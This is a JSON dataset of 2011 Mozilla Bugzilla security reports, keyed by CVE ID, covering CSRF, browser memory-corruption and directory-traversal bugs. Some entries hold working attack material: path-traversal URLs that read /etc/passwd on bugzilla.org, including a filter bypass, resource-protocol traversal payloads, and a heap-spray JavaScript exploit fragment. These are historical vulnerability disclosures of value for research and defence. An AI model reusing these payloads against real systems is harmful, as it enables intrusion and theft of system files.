{
  "year": 2011,
  "total": 94,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2011-0046": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621105",
        "title": "[SECURITY] Voting lacks CSRF protection",
        "description": "Voting lacks CSRF protection."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621110",
        "title": "[SECURITY] Quips (adding/approving/deleting) lacks CSRF protection",
        "description": "quips.cgi has no CSRF protection."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621108",
        "title": "[SECURITY] Creating/editing charts lacks CSRF protection",
        "description": "chart.cgi only supports tokens for deleting charts. Should also protect against unwanted chart creation/modification."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621090",
        "title": "[SECURITY] Adding saved searches lacks CSRF protection",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Build Identifier: Hi Mozilla people, I found a new CSRF, this time on bugzilla.mozilla.org It's easy, the remembered search is not protected and this could be used to post \"****\" on panels of legitimate users. I've made a simple PoC/Exploit to trigger the vulnerability (it's attached) Solution: Protect this request with a token as others Regards, Jose. Reproducible: Always Steps to Reproduce: See details Actual Results: See details Expected Results: See details See details"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621107",
        "title": "[SECURITY] Sanity checking lacks CSRF protection",
        "description": "sanitycheck.cgi has no CSRF protection. Should display an intermediary page asking the user if he/she wants to sanity check (including a token). Command-line shouldn't require the token."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621109",
        "title": "Column changing lacks CSRF protection",
        "description": "colchange.cgi doesn't have any CSRF protection."
      }
    ],
    "CVE-2011-0048": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=628034",
        "title": "[SECURITY] For not-logged-in users, the URL field doesn't safeguard against javascript: or data: URLs",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 Build Identifier: The javascript URI type can be used to execute javascript in a <a> tag. Click on the supplied url above. Reproducible: Always"
      }
    ],
    "CVE-2011-0049": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=628064",
        "title": "Directory traversal in majordomo2's 'help' command",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 Build Identifier: This is a very serious vulnerability and i would like to say that i respect your privacy and I have only done what is necessary to prove that this is a real issue and not a false positive. I like you guys, thank you for making the web a better place. http://bugzilla.org/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd verification: http://bugzilla.org/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/group Reproducible: Always"
      }
    ],
    "CVE-2011-0051": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=616659",
        "title": "Recursing the JavaScript eval function over itself eventually causes all dialogs with confirmation to evaluate to \"true\".",
        "description": "User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-us) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5 Build Identifier: http://www.mozilla.com/en-US/products/download.html?product=firefox-3.6.12&os=win&lang=en-US Obviously, code like eval(a=\"eval(a)\") causes the script to error out. But adding a try/catch block like eval(a=\"try{eval(a)}catch(b){/*code here*/}\") lets you catch the \"eval'd-out\" state and execute code in it. Any dialog box opened in this state instead shows a textless dialog box with two textless buttons, and pressing these buttons does not close this box. Closing the box with the corner \"X\" button causes input boxes (confirm, onbeforeunload, netscape.security.PrivilegeManager.enablePrivilege, etc.) to evaluate to \"true\". Reproducible: Always Steps to Reproduce: The following code will open a dialog: eval(a=\"try{eval(a)}catch(b){c=confirm('You will not see this text')}\") Actual Results: In Windows 7, the only immediate way to close the aforementioned dialog is by pressing the \"X\" corner button. If the user performs this action, Firefox will proceed as if the user pressed \"OK\", causing c == true. Expected Results: In a normal case, this action is the equivalent of pressing \"Cancel\", meaning c == false. See the attachment in the comments for an example that uses this vulnerability for arbitrary code execution."
      }
    ],
    "CVE-2011-0054": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=615657",
        "title": "Buffer overflow/Memory corruption: cg->upvarList.count <= cg->upvarMap.length",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12 Build Identifier: The following problem affects all Spidermonkey versions I tested (1.9.2 and 2.0) and hence Firefox 3.5.x and Firefox 4. Under test were mozilla-2.0-297086a0fb61 and mozilla-1-9-2-053f07027a38: There is a serious problem with the code that copies upvarMap.vector in jsscript.cpp. Using a combination of inner/outer functions with eval, we were able to trigger the following assertion (mozilla-2.0-297086a0fb61): Assertion failure: cg->upvarList.count <= cg->upvarMap.length, at jsscript.cpp:1224 The respective code looks as follows: if (cg->upvarList.count != 0) { JS_ASSERT(cg->upvarList.count <= cg->upvarMap.length); memcpy(script->upvars()->vector, cg->upvarMap.vector, cg->upvarList.count * sizeof(uint32)); cg->upvarList.clear(); cx->free(cg->upvarMap.vector); cg->upvarMap.vector = NULL; } In an optimized non-debug build, the memcpy simply either overruns the available space in script->upvars()->vector, or reads beyond cg->upvarMap.vector or both. The attacker can control cg->upvarList.count arbitrarily here. We suspect the issue to be exploitable although it shouldn't be too easy (the attacker can hardly control what is actually written, only the amount). I'll attach test.js to reproduce the problem and some valgrind logs showing different behavior depending on how large the upvar list gets. Using 24 additional upvars in the script triggers the assertion, using 32 crashes straight away without even asserting (I suspect two different problems here). Reproducible: Always Steps to Reproduce: 1. Run test.js 2. Observe crash/assertion Actual Results: Crash/Assertion Expected Results: Normal run."
      }
    ],
    "CVE-2011-0055": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=619255",
        "title": "GC hazard in JO() from json.cpp due to reuse of root (1.9.[12]-only)",
        "description": "On 1.9.2 branch JO() from json.cpp incorrectly reuse the passed vp parameter for rooting an iterator leading to a GC hazard. The following example demonstrates this for a debug build of JS shell: function iter() { ({}); gc(); yield 1; } function create_iter() { return iter(); } JSON.stringify({ get o() { var obj = {}; obj.__iterator__ = create_iter; return obj; }}); ~/m/192/js/src> ~/b/js/192dbg32/js ~/s/x.js Segmentation fault (core dumped) On trunk we are safe due to the conservative GC scanner."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=616009",
        "title": "JSON.stringify Dangling Pointer Remote Code Execution Vulnerability (ZDI-CAN-971)",
        "description": "ZDI-CAN-971: Mozilla Firefox JSON.stringify Dangling Pointer Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within js3250.dll. In the JSON.stringify() call chain js_HasOwnProperty() is called with an invalid pointer. The pointer becomes invalid due to being unrooted and garbage collection occurring. Dereferecing of this pointer allows a remote attacker to execute arbitrary code in the context of the user running the browser. Version(s) tested: Firefox 3.6.10 Platform(s) tested: Windows XP SP3 x86 There is a GC hazard in function |JO|. One can see that |obj| is rooted only at |vp[0]|. Then, if there is no replacer object associated or replacer is an array, |js_ValueToIterator| is called returning iterator instance at |keySource|, where |keySource| is a pointer == |vp|. Thus |obj| becomes unrooted while still being used as an argument in several functions' invocations along the |JO| body. POC triggers a jump to an invalid address in ecx, below: 0:000> ub 0033e2a1 js3250!js_LookupProperty+0x497f: 0033e28f 70dd jo js3250!js_LookupProperty+0x495e (0033e26e) 0033e291 54 push esp 0033e292 2478 and al,78h 0033e294 e9dcf0ffff jmp js3250!js_LookupProperty+0x3a65 (0033d375) 0033e299 8b542438 mov edx,dword ptr [esp+38h] 0033e29d 50 push eax 0033e29e 52 push edx 0033e29f ffd1 call ecx Call Stack: ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 0012ea70 0033e2a1 <Unloaded_ta.dll>+0x14f859f 0012eca4 00338556 js3250!js_LookupProperty+0x4991 0012ed48 0032cfd3 js3250!js_Invoke+0x286 0012ed78 0030ea07 js3250!JS_CloneFunctionObject+0x1493 0012ee2c 0030f8ff js3250!JS_CallFunctionValue+0x27 0012eef0 00370e96 js3250!js_AllocStack+0x24f 0012f02c 0033bbaa js3250!JS_NewArrayObject+0x316 0012f26c 00338556 js3250!js_LookupProperty+0x229a 0012f310 0032cfd3 js3250!js_Invoke+0x286 0012f340 0030ea07 js3250!JS_CloneFunctionObject+0x1493 0012f3e4 100be05a js3250!JS_CallFunctionValue+0x27 0012f590 1009635d xul!gfxRect::Condition+0x28a 0012f680 101066c1 xul!gfxWindowsFontGroup::MakeTextRun+0x1130c 0012f6e0 10106b71 xul!NS_Free_P+0x3f1 0012f728 1010ed88 xul!NS_Free_P+0x8a1 0012f7b4 1007482b xul!NS_Free_P+0x8ab8 0012f81c 10091ba7 xul!gfxWindowsSurface::gfxWindowsSurface+0x6c1b 0012f9b0 1011217e xul!gfxWindowsFontGroup::MakeTextRun+0xcb56 0012f9b4 100f11ab xul!NS_CycleCollectorSuspect2_P+0x15ee 0012f9d4 1006c81e xul!gfxRect::gfxRect+0x101b 0:000> ub 0033e2a1 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-0056": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=622015",
        "title": "JavaScript Atom Invalid Index Vulnerability -- iDefense [V-ikgwbx1hqs]",
        "description": "iDefense VCP Submission V-ikgwbx1hqs 12/29/2010 Mozilla Firefox JavaScript Atom Invalid Index Vulnerability Description: Remote exploitation of a memory corruption vulnerability in Mozilla Organization's FireFox could allow an attacker to execute arbitrary code with the privileges of the current user. The vulnerability occurs in the JavaScript engine (SpiderMonkey) of Mozilla FireFox. When compiling javascript, the Mozilla engine produces bytecode that is later interpreted in a virtual machine. Strings and other literals (so called atoms) are stored in an atom map. Opcodes that use values from the atom map take a 16 bit immediate constant operand that is used as an index in the atom map array. When more than 64k atoms are used, special handling is required because a 16 bit value would not suffice to address the desired atom. Therefore, the engine frames the opcode with an \"indexbaseX\" and a \"resetbase0\" opcode that move the atoms pointer forward and backward respectively. When an exception is thrown in between the indexbase and resetbase opcodes, the atoms pointer does not get reset and the exception object of the catch block is read from an invalid memory address. This results in an exploitable memory corruption vulnerability. Analysis: Exploitation of this vulnerability results in the execution of arbitrary code with the privileges of the user viewing the web page. To exploit this vulnerability, a targeted user must load a malicious webpage created by an attacker. An attacker typically accomplishes this via social engineering or injecting content into compromised, trusted sites. After the user visits the malicious web page, no further user interaction is needed. In order to exploit this vulnerability, it is necessary control various structures at the location of the invalid reference. By performing a heap spray it is possible to populate memory with the needed structures and obtain reliable arbitrary code execution. Credit: Christian Holler"
      }
    ],
    "CVE-2011-0057": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=626631",
        "title": "WebWorker causes firefox to crash [@ js::PropertyTable::search(int, bool) ]",
        "description": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:2.0b10pre) Gecko/20110116 Firefox/4.0b10pre Build Identifier: Mozilla/5.0 (X11; Linux x86_64; rv:2.0b10pre) Gecko/20110116 Firefox/4.0b10pre Simple WebWorker causes Firefox to crash. Run the listed page with at least one worker thread. Firefox will crash Reproducible: Always Steps to Reproduce: 1. Visit Web Page 2. Start up at least one Worker thread 3. wait Actual Results: Firefox crashes Expected Results: Backround thread run and posts data to the UI thread"
      }
    ],
    "CVE-2011-0058": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=607160",
        "title": "Buffer size calculation failure when running an absurdly long and complex text run",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 When creating a 2684354575-character long text run, containing many complex unicode characters and its font-weight property is 65537, inside a <div> that is 3px wide, the buffer size for a text run is incorrectly calculated. In my tests, I found that the program exits safely, but an attacker could leverage an incorrectly calculated buffer size to run arbitrary code. Reproducible: Always Steps to Reproduce: 1. View the testcase. Actual Results: A sustained period of hanging, followed by a \"Microsoft C++ Runtime\" exception. Expected Results: It should have just been a DOS. This was only tested against Windows 7 Home Edition. View the attached stack trace for proof of an incorrectly calculated buffer."
      }
    ],
    "CVE-2011-0059": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=573873",
        "title": "CSRF from 307 redirects",
        "description": "Since plugins are not made aware of redirects they are vulnerable to CSRF via307 redirects. Further details to be filled up by more knowledgeable folks."
      }
    ],
    "CVE-2011-0061": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=610601",
        "title": "Firefox crash [@ ycc_rgb_convert] [@ ycc_rgb_convert_argb] on image with src set to a resource with multipart/x-mixed-replace content type [Access Violation]",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 Visiting a webpage that contains an image with the src-attribute that refers to a multipart/x-mixed-replace resource , Firefox 3.6.12 crashes after some time. Exactly the same as bug 524921 Tested on Windows 7 Reproducible: Always Steps to Reproduce: 1. Visit test page 2. wait a few moments Actual Results: Firefox crashes Expected Results: Firefox don't crash The crash is very intermittent , sometimes firefox will crash after some seconds , and sometimes firefox don't crash at all."
      }
    ],
    "CVE-2011-0063": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=631307",
        "title": "Possible to bypass fix for CVE-2011-0049 (majordomo2 directory traversal in 'help' command)",
        "description": "Nikolas Sotiriu <nsotiriu@sotiriu.de> reported the following issue to security@ concerning a way to bypass the majordomo2 fix in bug 628064: ================================================================= So the bug is that the majordomo2 path for the bug (628064) is absolut terrible and not working. See attachment 506481 [details] [diff] [review]. Check the regex ($file =~ s!/?\\.\\./?!!g;) do you see it :) It deletes ../ but what happens if i ./.../ ? ./.../ becomes ../ http://bugzilla.org/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=./..././..././..././..././..././..././..././.../etc/passwd Maybe a regex like this is better: $file =~ s/\\.\\.//g; ================================================================="
      }
    ],
    "CVE-2011-0065": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=634986",
        "title": "Use-after-free vulnerability in OBJECT's mChannel (ZDI-CAN-1032)",
        "description": "The following was sent to security@mozilla.org today: ZDI-CAN-1032: Mozilla Firefox OBJECT mChannel Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page. The specific flaw exists within the OnChannelRedirect method. When an OBJECT element has no mChannel assigned, it is possible to call the |OnChannelRedirect| method, setting a nearly arbitrary object as the channel in use. |mChannel| will become a dangling pointer, allowing an attacker to execute arbitrary code under the context of the user running the browser. Version(s) tested: Firefox 3.6.13 Platform(s) tested: Windows XP SP3 From content/base/src/nsObjectLoadingContent.cpp: nsObjectLoadingContent::OnChannelRedirect(nsIChannel *aOldChannel, nsIChannel *aNewChannel, PRUint32 aFlags) { // If we're already busy with a new load, cancel the redirect if (aOldChannel != mChannel) { return NS_BINDING_ABORTED; } if (mClassifier) { mClassifier->OnRedirect(aOldChannel, aNewChannel); } mChannel = aNewChannel; return NS_OK; } When an OBJECT element (implementation of nsIChannelEventSink interface) has no |mChannel| assigned, it is possible to call the |OnChannelRedirect| method, setting a nearly arbitrary object as the channel in use. The problem is that |mChannel| is a weak reference (as defined in content/base/src/nsObjectLoadingContent.h) and will become a dangling pointer after the garbage collection cycle. The dangling pointer can be utilized by setting the \"data\" attribute to our OBJECT. This will call the |LoadObject| method, and load our OBJECT. nsObjectLoadingContent::LoadObject(nsIURI* aURI, PRBool aNotify, const nsCString& aTypeHint, PRBool aForceLoad) { ... if (mChannel) { ... mChannel->Cancel(NS_BINDING_ABORTED); ... } ... } -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-0066": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=634983",
        "title": "Use-after-free vulnerability in OBJECT's mObserverList (ZDI-CAN-1033)",
        "description": "The following was reported to security@mozilla.org by ZDI: ZDI-CAN-1033: Mozilla Firefox OBJECT mObserverList Remote Code Execution Vulnerabililty -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within Firefox's handling of observer OBJECTs. If an observer OBJECT is removed from the mObserverList during an iteration of LOOP_OVER_OBSERVERS macro, one can heap spray over |mObserverList.mNext| and change the execution flow. This would allow the attacker to execute arbitrary code under the context of the user running the browser. Version(s) tested: Firefox 3.6.13 Platform(s) tested: Windows XP SP3 As the OBJECT element implements nsIImageLoadingContent interface it is possible to register custom observer (implementing imgIDecoderObserver) and force our OBJECT removal during e.g. onStartContainer| callback (other hooks are probably dangerous as well). That would also destroy object's observers linked list, |mObserverList|. If that happens during iteration of LOOP_OVER_OBSERVERS macro one can heap spray over |mObserverList.mNext| and change the execution flow. From content/base/src/nsObjectLoadingContent.cpp: // Macro to call some func on each observer. This handles observers // removing themselves. #define LOOP_OVER_OBSERVERS(func_) \\ PR_BEGIN_MACRO \\ for (ImageObserver* observer = &mObserverList, *next; observer; \\ observer = next) { \\ next = observer->mNext; \\ if (observer->mObserver) { \\ observer->mObserver->func_; \\ } \\ } \\ PR_END_MACRO -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-0067": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=527935",
        "title": "Untrusted events should not trigger autocomplete popup",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729) Build Identifier: After bug 511615 was fixed, untrusted key events still cause the autocomplete popup to appear. By detecting whether or not the popup was triggered for certain inputs, it is possible to enumerate / brute force form history. Detection of the popup can be achieved with a Java applet placed underneath the text input. The applet will receive events when the popup disappears because its screen area needs to be repainted. This has been tested only on Windows XP, and I wouldn't expect this to work under composited desktop environments like Vista Aero or MacOS X. The technique I used in bug 511615 required user interaction to work. This method is fully automatic, but it takes longer to get the data as it performs a blind true/false search of the form history. The page also needs to be visible and focused for this to work. Although getting lots of data from searchbar-history takes a while, an attack targeted at credit card data stored in form history would be very quick since the search space is mostly numeric. Reproducible: Always Steps to Reproduce: 1. Send untrusted key events to text input field Actual Results: Autocomplete popup appears if value of text field matches form history Expected Results: Autocomplete popup should not appear"
      }
    ],
    "CVE-2011-0071": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=624764",
        "title": "Directory Traversal in resource protocol",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) By using a semi-colon \";\" character after the resource protocol, we can bypass the protections and use \"\\..\\\" in order to do directory traversal or use the colon \":\" character. It can be used for file/directory enumeration or including important javascript files in a script tag. For example for a windows box we can use: <script src=\"resource:///;\\..\\..\\..\\directory\\secret.js\"></script> Or <script src=\"resource:///;\\..\\..\\..\\directory\\secret.js::$data\"></script> Or <script src=\"resource:///something.com;\\..\\..\\..\\directory::$index_allocation\\secret.js\"></script> --- Linux box might be exploitable by: resource:///something.com;\\\\..\\\\..\\\\..\\\\ (as I haven't tried it in a Linux box yet) Reproducible: Always Steps to Reproduce: 1. In windows, Open the following URL by using Mozilla Firefox: resource:///;\\..\\..\\..\\ 2. You can see the root directory Actual Results: You can see the root directory Expected Results: I should be limited and get \"access denied\" for example I just find this bug in 15 minutes, and I am reporting this immediately to you after finding it. Therefore, excuse me if I have any mistake in writing the report."
      }
    ],
    "CVE-2011-0073": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=630919",
        "title": "nsTreeRange Dangling Pointer Remote Code Execution Vulnerability (ZDI-CAN-1084)",
        "description": "ZDI-CAN-1084: Mozilla Firefox nsTreeRange Dangling Pointer Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the way Firefox handles user defined functions of a nsTreeSelection element. When executing the function invalidateSelection it is possible to free the nsTreeSelection object that the function operates on. Any further operations on the freed object can result in remote code execution. Version(s) tested: Firefox 3.6.13 Platform(s) tested: Windows XP SP3 --------------------- Vulnerability details --------------------- View of XUL <tree> element exposes \"selection\" attribute. This in turn allows user to setup custom tree box object. One of |nsTreeSelection| methods is invalidateSelection(). From layout/xul/base/src/tree/src/nsTreeSelection.cpp: nsTreeSelection::InvalidateSelection() { if (mFirstRange) mFirstRange->Invalidate(); return NS_OK; } |mFirstRange| is defined as pointer to |nsTreeRange| struct. struct nsTreeRange { ... void Invalidate() { if (mSelection->mTree) mSelection->mTree->InvalidateRange(mMin, mMax); if (mNext) mNext->Invalidate(); } ... } If execution of our custom made method invalidateRange() causes destruction of all ranges withing selection (including |nsTreeRange| instance which code is being executed at the moment), |this| in the context of |Invalidate()| will be referring to already freed memory. In other words: value of |mNext| is under attackers' control. sel.tree = { invalidateRange: function(s,e) { sel.tree = null; sel.clearSelection(); var container = new Array(); var addr = unescape(\"%u0a0a%u0a0a\"); var shellcode = unescape(\"%u9090%u9090\"); // + var big = addr; while (big.length < 0x100000) big += big; var len = big.length - shellcode.length - 1; for (i = 0; i < 150; ++i) container.push(big.substring(0, len) + shellcode); var block = addr; while (block.length < 8) block += block; for (var i = 0; i < 1024*8; ++i) container.push(block + addr); } } This will remove the tree and replace the object with 0x0a0a0a0a. Its not 100% reliable, but it is a working exploit up to the DEP evasion. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-0082": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=660749",
        "title": "Firefox doesn't (re)validate certificates when loading a HTTPS page from the cache",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.16) Gecko/20110322 Fedora/3.6.16-1.fc14 Firefox/3.6.16 Build Identifier: Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 A Debian bug report indicated that Firefox 4.0.x handled the validation/revalidation of SSL certificates improperly. If a user were to visit a site with an untrusted certificate, Firefox would correctly display the warning about the untrusted connection. If a user were to confirm the security exception for a single session (not check off the \"permanently store this exception\"), then restart the browser and re-load the page, the contents of the page would be displayed from the Firefox cache. Upon reloading the page, the security warning would appear, but incorrectly indicates that the site provides a valid, verified certificate and there is no way to confirm the exception. This is not the case in Firefox 3.6.17 where when re-loading the browser and visiting the page, the untrusted connection warning comes up immediately, without showing the contents of the page, and allowing you to confirm the exception. Reproducible: Always Steps to Reproduce: 1) Visit a site with a self-signed certificate (such as https://kitenet.net/) and click \"I Understand The Risks\", click \"Add Exception\", uncheck \"Permanently store this exception\", click \"Confirm Security Exception\". The site's contents will be displayed. 2) Exit the browser. 3) Start Firefox again and visit the page you visited in step 1. The browser will show the contents of the page, even though its certificate should no longer be considered valid. 4) Refresh the page. The untrusted connection warning will display again. Click \"I Understand The Risks\", click \"Add Exception\". Firefox will indicate that \"This site provides valid, verified identification\" and does not allow you to confirm the security exception. References: [1] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=627552 [2] https://bugzilla.redhat.com/show_bug.cgi?id=709165 Note: I am able to successfully reproduce this on firefox 4.0.1 on a Fedora-15 fresh install"
      }
    ],
    "CVE-2011-0083": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=648090",
        "title": "Mozilla Firefox SVGPathSegList.replaceItem Remote Code Execution Vulnerability (ZDI-CAN-1142)",
        "description": "ZDI-CAN-1142: Mozilla Firefox SVGPathSegList.replaceItem Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the code responsible for parsing SVG path segment objects. The function nsSVGPathSegList::ReplaceItem() does not account for deletion of the segment object list within a user defined DOMAttrModified EventListener. Code within nsSVGPathSegList::ReplaceItem() references the segment list without verifying that it was not deleted in the aforementioned callback. This can be abused to create a dangling reference which can be leveraged to execute arbitrary code within the context of the browser. Version(s) tested: 3.6.13 Platform(s) tested: Win XP SP3 From content/svg/content/src/nsSVGPathSegList.cpp: NS_IMETHODIMP nsSVGPathSegList::ReplaceItem(nsIDOMSVGPathSeg *newItem, PRUint32 index, nsIDOMSVGPathSeg **_retval) { ... InsertElementAt(newItemSeg, index); RemoveFromCurrentList(static_cast<nsSVGPathSeg*>(mSegments.ObjectAt(index+1))); NS_ADDREF(*_retval = newItem); return NS_OK; } During execution of |InsertElementAt| \"DOMAttrModified\" event is dispatched. User's provided event handler will be called. During that callback it is possible to delete whole content of |mSegments|, e.g. by calling method clear() on pathSegList object. As |mSegments| is defined as |nsCOMArray| and method |ObjectAt| does not do out-of-bound check of index argument, previously |ObjectAt| freed memory will be referenced. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-0084": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=648094",
        "title": "Mozilla Firefox SVGTextElement.getCharNumAtPosition Remote Code Execution Vulnerability (ZDI-CAN-1143)",
        "description": "ZDI-CAN-1143: Mozilla Firefox SVGTextElement.getCharNumAtPosition Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the code responsible for parsing SVG text containers. The code within nsSVGGlyphFrame::GetCharNumAtPosition() does not account for user defined getter methods modifying or destroying the parent object. An attacker can abuse this flaw to create a dangling pointer which is referenced during the traversal of the SVG container hierarchy. This can be leveraged to execute arbitrary code within the context of the browser. Version(s) tested: 3.6.13 Platform(s) tested: Win XP SP3 From content/svg/content/src/nsSVGTextContentElement.cpp: NS_IMETHODIMP nsSVGTextContentElement::GetCharNumAtPosition(nsIDOMSVGPoint *point, PRInt32 *_retval) { ... nsSVGTextContainerFrame* metrics = GetTextContainerFrame(); if (metrics) *_retval = metrics->GetCharNumAtPosition(point); return NS_OK; } From layout/svg/base/src/nsSVGTextContainerFrame.cpp: nsSVGTextContainerFrame::GetCharNumAtPosition(nsIDOMSVGPoint *point) { PRInt32 index = -1; PRInt32 offset = 0; nsISVGGlyphFragmentNode *node = GetFirstGlyphFragmentChildNode(); while (node) { PRUint32 count = node->GetNumberOfChars(); if (count > 0) { PRInt32 charnum = node->GetCharNumAtPosition(point); if (charnum >= 0) { index = charnum + offset; } offset += count; // Keep going, multiple characters may match // and we must return the last one } node = GetNextGlyphFragmentChildNode(node); } return index; } And later we reach layout/svg/base/src/nsSVGGlyphFrame.cpp: nsSVGGlyphFrame::GetCharNumAtPosition(nsIDOMSVGPoint *point) { float xPos, yPos; point->GetX(&xPos); point->GetY(&yPos); nsRefPtr<gfxContext> tmpCtx = MakeTmpCtx(); CharacterIterator iter(this, PR_FALSE); ... } Note that |point->GetX(&xPos)| will execute user provided implementation of 'x' property getter (as specified in interface nsIDOMSVGPoint). At that moment we can remove our SVGTextElement nodes and all the related frames will be deleted as well. 